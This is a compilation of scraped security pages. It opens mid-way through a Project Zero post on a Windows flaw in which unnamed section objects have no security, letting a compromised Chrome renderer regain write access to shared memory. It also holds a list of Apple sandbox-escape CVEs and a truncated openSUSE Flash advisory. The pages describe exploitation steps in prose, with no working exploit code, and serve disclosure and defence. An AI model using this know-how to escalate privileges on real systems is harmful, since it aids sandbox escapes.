The ShareReadOnlyToProcess function delegates to an OS specific function. For [Windows](https://code.google.com/p/chromium/codesearch#chromium/src/base/memory/shared_memory_win.cc&sq=package:chromium&type=cs) this looked like:

bool SharedMemory::ShareToProcessCommon(ProcessHandle process,
                               SharedMemoryHandle \*new\_handle,
                               bool close\_self,
                               ShareMode share\_mode) {
  \*new\_handle = 0;
  DWORD access = FILE\_MAP\_READ;
  DWORD options = 0;
  HANDLE mapped\_file = mapped\_file\_;
  HANDLE result;
  if (share\_mode == SHARE\_CURRENT\_MODE && !read\_only\_)
    access |= FILE\_MAP\_WRITE;

  // \*SNIP\* ...

  if (!DuplicateHandle(GetCurrentProcess(), mapped\_file, process,
      &result, access, FALSE, options))
    return false;
  \*new\_handle = result;
  return true;
}

It might be more obvious if I show it in diagrammatic form. The section object is shared between the different processes but the handles have different permissions.
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWypPIBDnIuJRDoam8QNRIdJuIo67vYRJ2YDa_73lfrxTJtmCkabp9m7xH2TGjFAAsFJeeVP3SrOj_MWIbRIAFpNZfDG8GcKUWBXxQxKNJNzN4LCSy3RRSF0upQURIczsh8p4bV9XhHnprMgLEuCbI1nyHPOoOxdUWVNBN5XG1qF2r25gPwJxhipx9/s600/dm_02.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWypPIBDnIuJRDoam8QNRIdJuIo67vYRJ2YDa_73lfrxTJtmCkabp9m7xH2TGjFAAsFJeeVP3SrOj_MWIbRIAFpNZfDG8GcKUWBXxQxKNJNzN4LCSy3RRSF0upQURIczsh8p4bV9XhHnprMgLEuCbI1nyHPOoOxdUWVNBN5XG1qF2r25gPwJxhipx9/s624/dm_02.png)
When the broker process shares the section read-only it uses the [DuplicateHandle](http://msdn.microsoft.com/en-gb/library/windows/desktop/ms724251%28v%3Dvs.85%29.aspx) API to create a new handle in the sandboxed renderer process. It specifies FILE\_MAP\_READ as the desired permissions so that is all the permissions assigned to the renderer. Now because of the NT security model the renderer process shouldn't be able to re-open the section with write access as the process runs with virtually no permissions in its Token. You'd think that was the case but it turns out not to be. When Chrome created the original section it never supplied a name, it turns out section objects with NO names also have NO security. Surprise!

This behaviour is documented, sort-of. For example have a look at [this](http://msdn.microsoft.com/en-us/library/windows/desktop/aa379557%28v%3Dvs.85%29.aspx) MSDN page. Did you see the documented behaviour? It amounts to a throw away comment, with no effort to go into detail. The page doesn’t tell you which unnamed objects have no security, just that some unnamed objects DO have security (such as processes). So let's find out what determines this behaviour. If you dump the OBJECT\_TYPE\_INITIALIZER structure from the public kernel symbols you'll see the offender.

0:000> dt nt!\_OBJECT\_TYPE\_INITIALIZER
ntdll!\_OBJECT\_TYPE\_INITIALIZER
   +0x000 Length           : Uint2B
   +0x002 ObjectTypeFlags  : UChar
   +0x002 CaseInsensitive  : Pos 0, 1 Bit
   +0x002 UnnamedObjectsOnly : Pos 1, 1 Bit
   +0x002 UseDefaultObject : Pos 2, 1 Bit
   +0x002 SecurityRequired : Pos 3, 1 Bit     <---- Important Flag
   +0x002 MaintainHandleCount : Pos 4, 1 Bit
   +0x002 MaintainTypeList : Pos 5, 1 Bit
   +0x002 SupportsObjectCallbacks : Pos 6, 1 Bit
   +0x002 CacheAligned     : Pos 7, 1 Bit
   +0x004 ObjectTypeCode   : Uint4B
   +0x008 InvalidAttributes : Uint4B
   \* SNIP....

The important part of the type is the SecurityRequired flag. If you dump the section object type nt!MmSectionObjectType and compare it to something like the process type nt!PsProcessType you'll see the difference. I guess the question you might be asking is what other types have this same behaviour; well a quick script later on Windows 8.1 and you’ll get the following types which have the SecurityRequired flag set to 0, note of course that the Section type is among the list:

Adapter
ALPC Port
Callback
Controller
Device
Driver
Event
File
FilterCommunicationPort
IoCompletion
IoCompletionReserve
IRTimer
KeyedEvent
Mutant
PcwObject
PowerRequest
Profile
Section
Semaphore
SymbolicLink
Timer
TpWorkerFactory
Type
UserApcReserve
WaitCompletionPacket

There are some interesting types in the list, but remember these types only have no security if they have no name, which would make it trickier to exploit. Also some like “Type” are unlikely to ever be accessible in a user mode process, but it’s still worthwhile pointing them out.

Okay so how might we exploit this in practice? Turns out there was actually only one user of the ShareReadOnlyToProcess method at the time. It was part of the code which shared extension scripts between renderer processes (see [user\_script\_loader.cc](https://code.google.com/p/chromium/codesearch#chromium/src/chrome/browser/extensions/user_script_loader.cc&q=ShareReadONly&sq=package:chromium&l=195)). For reasons of efficiency these scripts were shared read-only to the renderers and relied on the OS enforcing this read-only property of the sections to prevent the renderers modifying the contents. On Linux/OSX this works but due to the issue I’ve just described it didn't work so well on Windows. The contents of the section looked like the image below, it contained a pickled version of the script and extension information.
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsFlvhxLrfrhTmftQgdDy-AwF_4KmpwkDhFJXIwlR6VTxn77mamkfvDHrwCXYUEVjFYMcnzhVCveWxKr1sG_i-NtDJsZDZHHAjoMOE2aedoaGCkd3FMoEXtAohtcRSO3wEdRxizsVGVRusVi27_ZO-D0IW5EtBdhDLVxMrIGtfHohVwepSj03G5fhX/s600/yvreetQUI-Pa9KPnVoD_XOSG7bao2BpdDF5z4uEnlJcS1Tsebt1XT5ZXCwWROmoffQZbcAudsCx4dMiZj7qbMTmnV2evqNnJGTpw0LH0NsZx0Nj6FryHQqy5p-KX-ufWywhMj3s.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsFlvhxLrfrhTmftQgdDy-AwF_4KmpwkDhFJXIwlR6VTxn77mamkfvDHrwCXYUEVjFYMcnzhVCveWxKr1sG_i-NtDJsZDZHHAjoMOE2aedoaGCkd3FMoEXtAohtcRSO3wEdRxizsVGVRusVi27_ZO-D0IW5EtBdhDLVxMrIGtfHohVwepSj03G5fhX/s744/yvreetQUI-Pa9KPnVoD_XOSG7bao2BpdDF5z4uEnlJcS1Tsebt1XT5ZXCwWROmoffQZbcAudsCx4dMiZj7qbMTmnV2evqNnJGTpw0LH0NsZx0Nj6FryHQqy5p-KX-ufWywhMj3s.png)
From a compromised renderer you can call DuplicateHandle to elevate the privileges of the section handle to re-gain write access, then modify the shared memory to execute arbitrary Javascript in any rendered page, including more-privileged chrome:// pages. While this is not directly a sandbox breakout it could be used as part of a chain as demonstrated in [previous attacks](http://blog.chromium.org/2012/06/tale-of-two-pwnies-part-2.html) against the Chrome sandbox. Of course a bug like this might be even more important when [site-isolation](http://www.chromium.org/developers/design-documents/site-isolation) is enabled as a default in Chrome.
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjReYqcI0p94gZX1jKjGijX_BKku7gVYI7j8HQ836gj-kK5CiK495i3MJLAt1uikXlQ-2MK02davDtBDK3X8zfoIz8HtQ2Dl32U9M-RhvRBdIIpE9c_5lfcshGRuy8ZtexF8XMAE5R9uvSq8oOvFzSHx2JsWPr7TF1IvU0fjnazfDg-rOPXyCRgWJ-a/s600/dm_04.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjReYqcI0p94gZX1jKjGijX_BKku7gVYI7j8HQ836gj-kK5CiK495i3MJLAt1uikXlQ-2MK02davDtBDK3X8zfoIz8HtQ2Dl32U9M-RhvRBdIIpE9c_5lfcshGRuy8ZtexF8XMAE5R9uvSq8oOvFzSHx2JsWPr7TF1IvU0fjnazfDg-rOPXyCRgWJ-a/s623/dm_04.png)
One final note on how you might find similar issues in other applications. Remember that even though each process has different handles, each refers to the same section object in the kernel. A quick way to check on this is to use a tool such as [Process Hacker](http://processhacker.sourceforge.net/) or [Process Explorer](http://technet.microsoft.com/en-gb/sysinternals/bb896653.aspx) and look at the handle table. While not the default you can add the Object Address column to the table, you can then use this information when looking at unnamed sections to determine if any are shared with a more privileged process, and whether any sections are only granted FILE\_MAP\_READ permissions in the low-privileged process.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjU38vTZsWuAfyFQyGAq7s9bPMLUw9LDmDXjIZecnzHZzrI7eLszZP881I5anKnKZkKdhOV9kjbCVxiZ7q0lTB1FxGH-Sxj4gvkdgzjuJw-tjKkA_We1V9a923iQQ2q-M_MB8-UrHJCzrLGclf-qgBzevw4wzwCqE2Toob2gEwh2ghrhgWvvcxqvQNL/s600/dm_05.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjU38vTZsWuAfyFQyGAq7s9bPMLUw9LDmDXjIZecnzHZzrI7eLszZP881I5anKnKZkKdhOV9kjbCVxiZ7q0lTB1FxGH-Sxj4gvkdgzjuJw-tjKkA_We1V9a923iQQ2q-M_MB8-UrHJCzrLGclf-qgBzevw4wzwCqE2Toob2gEwh2ghrhgWvvcxqvQNL/s624/dm_05.png)
This bug is the result of a corner case in the Windows OS. I can understand the reason why it works this way, unnamed objects are not supposed to be trivially shareable so why go to the expense of performing a security check unnecessarily. Strangely even if you try to set a DACL on the section object the kernel will return an error, there is no actual way to secure these types of objects other than by setting a name. When you try and make a secure sandbox on top of such an OS these things can come back to bite you.

Posted by
Anonymous

at

[12:50 PM](https://googleprojectzero.blogspot.com/2014/10/did-man-with-no-name-feel-insecure.html "permanent link")

[2 comments:](https://googleprojectzero.blogspot.com/2014/10/did-man-with-no-name-feel-insecure.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=8483008589188560468&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8483008589188560468&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8483008589188560468&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8483008589188560468&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8483008589188560468&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8483008589188560468&target=pinterest "Share to Pinterest")

## Wednesday, October 1, 2014

### [More Mac OS X and iPhone sandbox escapes and kernel bugs](https://googleprojectzero.blogspot.com/2014/10/more-mac-os-x-and-iphone-sandbox.html)

Posted by Ian Beer

A couple of weeks ago Apple released [OS X 10.9.5](http://support.apple.com/kb/ht6443) and [iOS 8](http://support.apple.com/kb/HT6441) which fixed a number of sandbox escapes and privilege escalation bugs found by Project Zero. All-bar-one of these bugs were found via manual source code auditing where there was source and binary analysis where there wasn’t. As always, click through the bugs for proof-of-concept code and further details:

CVE-2014-4403\* [ <https://code.google.com/p/google-security-research/issues/detail?id=23> ] was as issue allowing a kernel ASLR bypass on OS X due to insufficient randomization of very early kernel heap allocations, the addresses of which could be leaked using the unprivileged SGDT instruction. This bug could be exploited from within any sandbox on OS X and allowed an attacker to determine the load address of the kernel.

CVE-2014-4394\* [ <https://code.google.com/p/google-security-research/issues/detail?id=28> ]
CVE-2014-4395\* [ <https://code.google.com/p/google-security-research/issues/detail?id=29> ]
CVE-2014-4401\* [ <https://code.google.com/p/google-security-research/issues/detail?id=30> ]
CVE-2014-4396\* [ <https://code.google.com/p/google-security-research/issues/detail?id=30> ]
CVE-2014-4397\* [ <https://code.google.com/p/google-security-research/issues/detail?id=30> ]
CVE-2014-4400\* [ <https://code.google.com/p/google-security-research/issues/detail?id=30> ]
CVE-2014-4399\* [ <https://code.google.com/p/google-security-research/issues/detail?id=30> ]
CVE-2014-4398\* [ <https://code.google.com/p/google-security-research/issues/detail?id=32> ]
CVE-2014-4416\* [ <https://code.google.com/p/google-security-research/issues/detail?id=34> ]
were all bounds-checking bugs in the driver for the Intel integrated HD GPU present on all current-generation Macs. Eight of these bugs allowed controlled kernel memory corruption from with most sandboxes on OS X (those with access to the GPU such as the Safari renderer process or the Chrome GPU process.)

CVE-2014-4402\* [ <https://code.google.com/p/google-security-research/issues/detail?id=33> ] was another case of missing bounds checks, this time in another part of the graphics acceleration pipeline.

CVE-2014-4376\* [ <https://code.google.com/p/google-security-research/issues/detail?id=31> ] was a kernel NULL-pointer dereference when setting up IOKit shared memory. This was exploitable from within some sandboxed 32-bit processes on OS X (for example the Chrome GPU process.) As is true with all these bugs this bug also allows any unsandboxed processes to execute code in the kernel.

CVE-2014-4418 [ <https://code.google.com/p/google-security-research/issues/detail?id=36> ]
No CVE\* [ <https://code.google.com/p/google-security-research/issues/detail?id=35> ]
were bugs affecting OS X and iOS in the implementation of the IOKit IODataQueue class where the kernel trusted index and size fields in shared memory which was mapped into userspace and writable. Looking at the [release notes for iOS 8](http://support.apple.com/kb/HT6441) these bugs seem to be very similar to one used in the recent Pangu Team jailbreak which was released a few days after these bugs were reported to Apple.

CVE-2014-4389 [ <https://code.google.com/p/google-security-research/issues/detail?id=39> ]
were integer overflows in the bounds checking code of IODataQueue allowing kernel memory corruption on iOS and OS X.

CVE-2014-4390 [ <https://code.google.com/p/google-security-research/issues/detail?id=37> ]
was another shared memory queuing bug, this time in the bluetooth stack.

CVE-2014-4404+ [ <https://code.google.com/p/google-security-research/issues/detail?id=40> ]
was an interesting kernel heap overflow when parsing a binary keyboard map which affected iOS and OS X and was reachable by setting an IOKit registry value. See the linked bug for more details along with a PoC demonstrating kernel instruction pointer control.

CVE-2014-4379 [ <https://code.google.com/p/google-security-research/issues/detail?id=42> ]
was another bug in the keyboard mapping code affecting iOS and OS X allowing userspace to read arbitrary kernel memory.

CVE-2014-4405+ [ <https://code.google.com/p/google-security-research/issues/detail?id=41> ]
was a kernel NULL pointer dereference due to incorrect error handling in the key map parsing code, again see the linked bug for a PoC demonstrating kernel instruction pointer control on OS X.

Finding and eliminating sandbox escapes is an important focus for Project Zero. The attack surface to break out of a sandbox is often smaller than the attack surface available to remote attackers to gain an initial foothold inside a sandbox. Therefore, strengthening sandboxes represents a solid return on investment of time.

Our research seems to indicate that sandbox break-outs on OS X and iOS are an under-researched topic. We’d encourage others to join us in bringing these sandboxes up to strength.

You can keep up-to-date with the latest Project Zero research by subscribing to labels in our bug tracker: <https://code.google.com/p/google-security-research/issues/subscriptions>

(\*) These bugs exceeded Project Zero’s standard 90-day disclosure deadline.
(+) These bugs were only fixed on iOS and remain unpatched on OS X.

Posted by
Anonymous

at

[3:58 PM](https://googleprojectzero.blogspot.com/2014/10/more-mac-os-x-and-iphone-sandbox.html "permanent link")

[No comments:](https://googleprojectzero.blogspot.com/2014/10/more-mac-os-x-and-iphone-sandbox.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=8014650004844462084&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8014650004844462084&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8014650004844462084&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8014650004844462084&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8014650004844462084&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8014650004844462084&target=pinterest "Share to Pinterest")

[Newer Posts](https://googleprojectzero.blogspot.com/search?updated-max=2014-11-24T15:52:00-08:00&max-results=1&reverse-paginate=true "Newer Posts")

[Older Posts](https://googleprojectzero.blogspot.com/search?updated-max=2014-10-01T15:58:00-07:00&max-results=1 "Older Posts")

[Home](https://googleprojectzero.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://googleprojectzero.blogspot.com/feeds/posts/default)

## Search This Blog

|  |  |
| --- | --- |

## Pages

* [About Project Zero](https://googleprojectzero.blogspot.com/p/about-project-zero.html)
* [Working at Project Zero](https://googleprojectzero.blogspot.com/p/working-at-project-zero.html)
* [0day "In the Wild"](https://googleprojectzero.blogspot.com/p/0day.html)
* [0day Exploit Root Cause Analyses](https://googleprojectzero.github.io/0days-in-the-wild/rca.html)
* [Vulnerability Disclosure FAQ](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html)

## Archives

* ►
  [2024](https://googleprojectzero.blogspot.com/2024/)
  (12)
  + ►
    [December](https://googleprojectzero.blogspot.com/2024/12/)
    (3)
  + ►
    [November](https://googleprojectzero.blogspot.com/2024/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2024/10/)
    (2)
  + ►
    [June](https://googleprojectzero.blogspot.com/2024/06/)
    (3)
  + ►
    [April](https://googleprojectzero.blogspot.com/2024/04/)
    (2)

* ►
  [2023](https://googleprojectzero.blogspot.com/2023/)
  (11)
  + ►
    [November](https://googleprojectzero.blogspot.com/2023/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2023/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2023/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2023/08/)
    (4)
  + ►
    [April](https://googleprojectzero.blogspot.com/2023/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2023/03/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2023/01/)
    (2)

* ►
  [2022](https://googleprojectzero.blogspot.com/2022/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2022/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2022/11/)
    (3)
  + ►
    [October](https://googleprojectzero.blogspot.com/2022/10/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2022/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2022/06/)
    (3)
  + ►
    [May](https://googleprojectzero.blogspot.com/2022/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2022/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2022/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2022/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2022/01/)
    (1)

* ►
  [2021](https://googleprojectzero.blogspot.com/2021/)
  (24)
  + ►
    [December](https://googleprojectzero.blogspot.com/2021/12/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2021/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2021/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2021/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2021/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2021/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2021/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2021/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2021/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2021/01/)
    (10)

* ►
  [2020](https://googleprojectzero.blogspot.com/2020/)
  (36)
  + ►
    [December](https://googleprojectzero.blogspot.com/2020/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2020/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2020/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2020/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2020/08/)
    (5)
  + ►
    [July](https://googleprojectzero.blogspot.com/2020/07/)
    (8)
  + ►
    [June](https://googleprojectzero.blogspot.com/2020/06/)
    (2)
  + ►
    [April](https://googleprojectzero.blogspot.com/2020/04/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2020/02/)
    (4)
  + ►
    [January](https://googleprojectzero.blogspot.com/2020/01/)
    (5)

* ►
  [2019](https://googleprojectzero.blogspot.com/2019/)
  (27)
  + ►
    [December](https://googleprojectzero.blogspot.com/2019/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2019/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2019/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2019/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2019/08/)
    (11)
  + ►
    [May](https://googleprojectzero.blogspot.com/2019/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2019/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2019/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2019/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2019/01/)
    (2)

* ►
  [2018](https://googleprojectzero.blogspot.com/2018/)
  (22)
  + ►
    [December](https://googleprojectzero.blogspot.com/2018/12/)
    (7)
  + ►
    [November](https://googleprojectzero.blogspot.com/2018/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2018/10/)
    (4)
  + ►
    [September](https://googleprojectzero.blogspot.com/2018/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2018/08/)
    (3)
  + ►
    [July](https://googleprojectzero.blogspot.com/2018/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2018/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2018/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2018/04/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2018/01/)
    (1)

* ►
  [2017](https://googleprojectzero.blogspot.com/2017/)
  (19)
  + ►
    [December](https://googleprojectzero.blogspot.com/2017/12/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2017/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2017/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2017/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2017/07/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2017/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2017/04/)
    (6)
  + ►
    [March](https://googleprojectzero.blogspot.com/2017/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2017/02/)
    (2)

* ►
  [2016](https://googleprojectzero.blogspot.com/2016/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2016/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2016/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2016/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2016/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2016/08/)
    (1)
  + ►
    [July](https://googleprojectzero.blogspot.com/2016/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2016/06/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2016/03/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2016/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2016/01/)
    (1)

* ►
  [2015](https://googleprojectzero.blogspot.com/2015/)
  (33)
  + ►
    [December](https://googleprojectzero.blogspot.com/2015/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2015/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2015/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2015/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2015/08/)
    (6)
  + ►
    [July](https://googleprojectzero.blogspot.com/2015/07/)
    (5)
  + ►
    [June](https://googleprojectzero.blogspot.com/2015/06/)
    (4)
  + ►
    [May](https://googleprojectzero.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2015/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2015/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2015/02/)
    (3)
  + ►
    [January](https://googleprojectzero.blogspot.com/2015/01/)
    (2)

* ▼
  [2014](https://googleprojectzero.blogspot.com/2014/)
  (11)
  + ►
    [December](https://googleprojectzero.blogspot.com/2014/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2014/11/)
    (2)
  + ▼
    [October](https://googleprojectzero.blogspot.com/2014/10/)
    (2)
    - [Did the “Man With No Name” Feel Insecure?](https://googleprojectzero.blogspot.com/2014/10/did-man-with-no-name-feel-insecure.html)
    - [More Mac OS X and iPhone sandbox escapes and kerne...](https://googleprojectzero.blogspot.com/2014/10/more-mac-os-x-and-iphone-sandbox.html)
  + ►
    [September](https://googleprojectzero.blogspot.com/2014/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2014/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2014/07/)
    (3)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from packetstormsecurity.com_115fe78c_20250125_123243.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from lists.opensuse.org_5c4f83db_20250125_123240.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/QNMDKMT2BAFV54Z53CNOUKMWDOIXXVW7/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/QNMDKMT2BAFV54Z53CNOUKMWDOIXXVW7/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/QNMDKMT2BAFV54Z53CNOUKMWDOIXXVW7/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/QNMDKMT2BAFV54Z53CNOUKMWDOIXXVW7/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/QNMDKMT2BAFV54Z53CNOUKMWDOIXXVW7/#QNMDKMT2BAFV54Z53CNOUKMWDOIXXVW7)

# [security-announce] SUSE-SU-2014:1124-1: important: Security update for flash-player

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

12 Sep
2014

12 Sep
'14

23:04

SUSE Security Update: Security update for flash-player
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: SUSE-SU-2014:1124-1
Rating: important
References: #895856
Cross-References: CVE-2014-0547 CVE-2014-0548 CVE-2014-0549
CVE-2014-0550 CVE-2014-0551 CVE-2014-0552
CVE-2014-0553 CVE-2014-0554 CVE-2014-0555
CVE-2014-0556 CVE-2014-0557 CVE-2014-0559
Affected Products:
SUSE Linux Enterprise Desktop 11 SP3
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes 12 vulnerabilities is now available.
It includes one version update.
Description:
Adobe Flash Player has been updated to 11.2.202.406 which fixes various
security issues.
These updates:
\* resolve a memory leakage vulnerability that could have been used to
bypass memory address randomization (CVE-2014-0557).
\* resolve a security bypass vulnerability (CVE-2014-0554).
\* resolve a use-after-free vulnerability that could have lead to code
execution (CVE-2014-0553).
\* resolve memory corruption vulnerabilities that could have lead to
code execution (CVE-2014-0547, CVE-2014-0549, CVE-2014-0550,
CVE-2014-0551, CVE-2014-0552, CVE-2014-0555).
\* resolve a vulnerability that could have been used to bypass the same
origin policy (CVE-2014-0548).
\* resolve a heap buffer overflow vulnerability that could have lead to
code execution (CVE-2014-0556, CVE-2014-0559).
More information can be found on
<http://helpx.adobe.com/security/products/flash-player/apsb14-21.html>
<[http://helpx.adobe.com/security/products/flash-player/apsb14-21.html>](http://helpx.adobe.com/security/products/flash-player/apsb14-21.html%3E)
Security Issues:
\* CVE-2014-0547
<[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0547>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0547%3E)
\* CVE-2014-0548
<[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0548>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0548%3E)
\* CVE-2014-0549
<[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0549>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0549%3E)
\* CVE-2014-0550
<[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0550>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0550%3E)
\* CVE-2014-0551
<[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0551>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0551%3E)
\* CVE-2014-0552
